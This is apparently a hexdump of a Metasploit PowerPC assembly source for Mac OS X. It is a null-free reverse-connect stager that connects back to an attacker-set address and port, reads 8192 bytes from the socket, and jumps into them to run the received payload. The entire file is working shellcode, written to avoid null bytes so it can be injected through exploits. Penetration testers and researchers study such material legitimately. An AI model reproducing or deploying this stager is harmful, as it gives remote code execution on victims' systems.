00000000  3b 3b 0d 0a 3b 0d 0a 3b  20 20 20 20 20 20 20 20  |;;..;..;        |
00000010  4e 61 6d 65 3a 20 73 74  61 67 65 72 5f 73 6f 63  |Name: stager_soc|
00000020  6b 5f 72 65 76 65 72 73  65 5f 6e 66 2e 61 73 6d  |k_reverse_nf.asm|
00000030  0d 0a 3b 20 20 20 51 75  61 6c 69 74 69 65 73 3a  |..;   Qualities:|
00000040  20 4e 75 6c 6c 2d 46 72  65 65 0d 0a 3b 20 20 20  | Null-Free..;   |
00000050  50 6c 61 74 66 6f 72 6d  73 3a 20 4d 61 63 4f 53  |Platforms: MacOS|
00000060  20 58 20 2f 20 50 50 43  0d 0a 3b 20 20 20 20 20  | X / PPC..;     |
00000070  41 75 74 68 6f 72 73 3a  20 48 20 44 20 4d 6f 6f  |Authors: H D Moo|
00000080  72 65 20 3c 20 68 64 6d  20 5b 61 74 5d 20 6d 65  |re < hdm [at] me|
00000090  74 61 73 70 6c 6f 69 74  2e 63 6f 6d 20 3e 0d 0a  |tasploit.com >..|
000000a0  3b 20 20 20 20 20 56 65  72 73 69 6f 6e 3a 20 24  |;     Version: $|
000000b0  52 65 76 69 73 69 6f 6e  3a 20 31 2e 31 20 24 0d  |Revision: 1.1 $.|
000000c0  0a 3b 20 20 20 20 20 4c  69 63 65 6e 73 65 3a 0d  |.;     License:.|
000000d0  0a 3b 0d 0a 3b 20 20 20  20 20 20 20 20 54 68 69  |.;..;        Thi|
000000e0  73 20 66 69 6c 65 20 69  73 20 70 61 72 74 20 6f  |s file is part o|
000000f0  66 20 74 68 65 20 4d 65  74 61 73 70 6c 6f 69 74  |f the Metasploit|
00000100  20 45 78 70 6c 6f 69 74  20 46 72 61 6d 65 77 6f  | Exploit Framewo|
00000110  72 6b 0d 0a 3b 20 20 20  20 20 20 20 20 61 6e 64  |rk..;        and|
00000120  20 69 73 20 73 75 62 6a  65 63 74 20 74 6f 20 74  | is subject to t|
00000130  68 65 20 73 61 6d 65 20  6c 69 63 65 6e 73 65 73  |he same licenses|
00000140  20 61 6e 64 20 63 6f 70  79 72 69 67 68 74 73 20  | and copyrights |
00000150  61 73 0d 0a 3b 20 20 20  20 20 20 20 20 74 68 65  |as..;        the|
00000160  20 72 65 73 74 20 6f 66  20 74 68 69 73 20 70 61  | rest of this pa|
00000170  63 6b 61 67 65 2e 0d 0a  3b 0d 0a 3b 20 44 65 73  |ckage...;..; Des|
00000180  63 72 69 70 74 69 6f 6e  3a 0d 0a 3b 0d 0a 3b 20  |cription:..;..; |
00000190  20 20 20 20 20 20 20 43  6f 6e 6e 65 63 74 73 20  |       Connects |
000001a0  62 61 63 6b 2c 20 72 65  61 64 73 20 38 31 39 32  |back, reads 8192|
000001b0  20 62 79 74 65 73 2c 20  6a 75 6d 70 73 20 69 6e  | bytes, jumps in|
000001c0  74 6f 20 70 61 79 6c 6f  61 64 2e 0d 0a 3b 20 20  |to payload...;  |
000001d0  20 20 20 20 20 20 53 6f  63 6b 65 74 20 64 65 73  |      Socket des|
000001e0  63 72 69 70 74 6f 72 20  69 73 20 6c 65 66 74 20  |criptor is left |
000001f0  69 6e 20 72 33 30 2e 0d  0a 3b 0d 0a 3b 3b 0d 0a  |in r30...;..;;..|
00000200  0d 0a 0d 0a 2e 67 6c 6f  62 6c 20 5f 6d 61 69 6e  |.....globl _main|
00000210  0d 0a 2e 74 65 78 74 0d  0a 5f 6d 61 69 6e 3a 0d  |...text.._main:.|
00000220  0a 0d 0a 5f 73 6f 63 6b  65 74 3a 09 0d 0a 09 6c  |..._socket:....l|
00000230  69 09 09 72 32 37 2c 20  30 78 33 30 33 30 20 2b  |i..r27, 0x3030 +|
00000240  20 39 37 0d 0a 09 73 75  62 69 09 72 30 2c 20 72  | 97...subi.r0, r|
00000250  32 37 2c 20 30 78 33 30  33 30 20 2b 20 39 37 20  |27, 0x3030 + 97 |
00000260  2d 20 39 37 0d 0a 09 73  75 62 69 09 72 33 2c 20  |- 97...subi.r3, |
00000270  72 32 37 2c 20 30 78 33  30 33 30 20 2b 20 39 37  |r27, 0x3030 + 97|
00000280  20 2d 20 32 0d 0a 09 73  75 62 69 09 72 34 2c 20  | - 2...subi.r4, |
00000290  72 32 37 2c 20 30 78 33  30 33 30 20 2b 20 39 37  |r27, 0x3030 + 97|
000002a0  20 2d 20 31 0d 0a 09 73  75 62 69 09 72 35 2c 20  | - 1...subi.r5, |
000002b0  72 32 37 2c 20 30 78 33  30 33 30 20 2b 20 39 37  |r27, 0x3030 + 97|
000002c0  20 2d 20 36 0d 0a 0d 0a  09 2e 6c 6f 6e 67 09 30  | - 6......long.0|
000002d0  78 34 34 66 66 66 66 30  32 0d 0a 09 78 6f 72 09  |x44ffff02...xor.|
000002e0  09 72 35 2c 20 72 35 2c  20 72 35 0d 0a 09 6d 72  |.r5, r5, r5...mr|
000002f0  09 09 72 33 30 2c 20 72  33 0d 0a 0d 0a 5f 73 74  |..r30, r3...._st|
00000300  6f 72 65 61 64 64 72 3a  0d 0a 0d 0a 09 3b 20 70  |oreaddr:.....; p|
00000310  6f 72 74 20 2d 20 70 61  74 63 68 20 74 68 65 20  |ort - patch the |
00000320  78 6f 72 20 77 6f 72 64  0d 0a 09 6c 69 09 09 72  |xor word...li..r|
00000330  32 35 2c 20 28 30 78 32  32 31 31 5e 30 78 34 31  |25, (0x2211^0x41|
00000340  34 32 29 0d 0a 09 78 6f  72 69 09 72 32 35 2c 20  |42)...xori.r25, |
00000350  72 32 35 2c 20 30 78 34  31 34 32 0d 0a 09 73 75  |r25, 0x4142...su|
00000360  62 69 09 72 32 39 2c 20  72 32 37 2c 20 30 78 33  |bi.r29, r27, 0x3|
00000370  30 33 30 20 2b 20 39 37  20 2d 20 32 0d 0a 09 73  |030 + 97 - 2...s|
00000380  6c 77 69 09 72 32 39 2c  20 72 32 39 2c 20 31 36  |lwi.r29, r29, 16|
00000390  09 0d 0a 09 6f 72 09 09  72 32 39 2c 20 72 32 39  |....or..r29, r29|
000003a0  2c 20 72 32 35 0d 0a 09  73 74 77 09 09 72 32 39  |, r25...stw..r29|
000003b0  2c 20 2d 32 30 28 72 31  29 0d 0a 0d 0a 09 3b 20  |, -20(r1).....; |
000003c0  61 64 64 72 20 2d 20 70  61 74 63 68 20 74 68 65  |addr - patch the|
000003d0  20 78 6f 72 20 64 77 6f  72 64 0d 0a 09 6c 69 73  | xor dword...lis|
000003e0  09 09 72 32 39 2c 20 68  69 31 36 28 30 78 37 66  |..r29, hi16(0x7f|
000003f0  30 30 30 30 30 31 5e 30  78 30 31 30 32 30 33 30  |000001^0x0102030|
00000400  34 29 0d 0a 09 6f 72 69  09 09 72 32 39 2c 20 72  |4)...ori..r29, r|
00000410  32 39 2c 20 6c 6f 31 36  28 30 78 37 66 30 30 30  |29, lo16(0x7f000|
00000420  30 30 31 5e 30 78 30 31  30 32 30 33 30 34 29 0d  |001^0x01020304).|
00000430  0a 09 6c 69 73 09 09 72  32 38 2c 20 68 69 31 36  |..lis..r28, hi16|
00000440  28 30 78 30 31 30 32 30  33 30 34 29 0d 0a 09 6f  |(0x01020304)...o|
00000450  72 69 09 09 72 32 38 2c  20 72 32 38 2c 20 6c 6f  |ri..r28, r28, lo|
00000460  31 36 28 30 78 30 31 30  32 30 33 30 34 29 0d 0a  |16(0x01020304)..|
00000470  09 78 6f 72 09 09 72 32  39 2c 20 72 32 39 2c 20  |.xor..r29, r29, |
00000480  72 32 38 0d 0a 09 73 74  77 09 09 72 32 39 2c 20  |r28...stw..r29, |
00000490  2d 31 36 28 72 31 29 0d  0a 0d 0a 6b 6f 6e 6e 65  |-16(r1)....konne|
000004a0  63 74 3a 0d 0a 09 6c 61  09 09 72 34 2c 20 2d 32  |ct:...la..r4, -2|
000004b0  30 28 72 31 29 0d 0a 09  73 75 62 69 09 72 35 2c  |0(r1)...subi.r5,|
000004c0  20 72 32 37 2c 20 30 78  33 30 33 30 20 2b 20 39  | r27, 0x3030 + 9|
000004d0  37 20 2d 20 31 36 0d 0a  09 73 75 62 69 09 72 30  |7 - 16...subi.r0|
000004e0  2c 20 72 32 37 2c 20 30  78 33 30 33 30 20 2b 20  |, r27, 0x3030 + |
000004f0  39 37 20 2d 20 39 38 0d  0a 09 6d 72 09 09 72 33  |97 - 98...mr..r3|
00000500  2c 20 72 33 30 0d 0a 09  2e 6c 6f 6e 67 09 30 78  |, r30....long.0x|
00000510  34 34 66 66 66 66 30 32  0d 0a 09 78 6f 72 09 09  |44ffff02...xor..|
00000520  72 35 2c 20 72 35 2c 20  72 35 0d 0a 09 09 0d 0a  |r5, r5, r5......|
00000530  72 65 61 64 65 72 3a 0d  0a 09 6c 69 09 09 72 32  |reader:...li..r2|
00000540  39 2c 20 30 78 33 33 33  30 0d 0a 09 73 72 61 77  |9, 0x3330...sraw|
00000550  69 09 72 32 39 2c 20 72  32 39 2c 20 31 32 0d 0a  |i.r29, r29, 12..|
00000560  0d 0a 09 73 75 62 69 09  72 30 2c 20 72 32 37 2c  |...subi.r0, r27,|
00000570  20 30 78 33 30 33 30 20  2b 20 39 37 20 2d 20 33  | 0x3030 + 97 - 3|
00000580  0d 0a 09 6d 72 09 09 72  33 2c 20 72 33 30 0d 0a  |...mr..r3, r30..|
00000590  09 73 75 62 69 09 72 34  2c 20 72 31 2c 20 38 31  |.subi.r4, r1, 81|
000005a0  39 32 2b 34 34 0d 0a 09  6c 69 09 09 72 35 2c 20  |92+44...li..r5, |
000005b0  38 31 39 32 2b 34 34 0d  0a 09 6d 74 63 74 72 09  |8192+44...mtctr.|
000005c0  72 34 0d 0a 09 2e 6c 6f  6e 67 09 30 78 34 34 66  |r4....long.0x44f|
000005d0  66 66 66 30 32 0d 0a 09  78 6f 72 09 09 72 35 2c  |fff02...xor..r5,|
000005e0  20 72 35 2c 20 72 35 0d  0a 09 78 6f 72 2e 09 72  | r5, r5...xor..r|
000005f0  35 2c 20 72 35 2c 20 72  35 0d 0a 09 62 6c 65 63  |5, r5, r5...blec|
00000600  74 72 0d 0a 09 78 6f 72  09 09 72 35 2c 20 72 35  |tr...xor..r5, r5|
00000610  2c 20 72 35                                       |, r5|
00000614
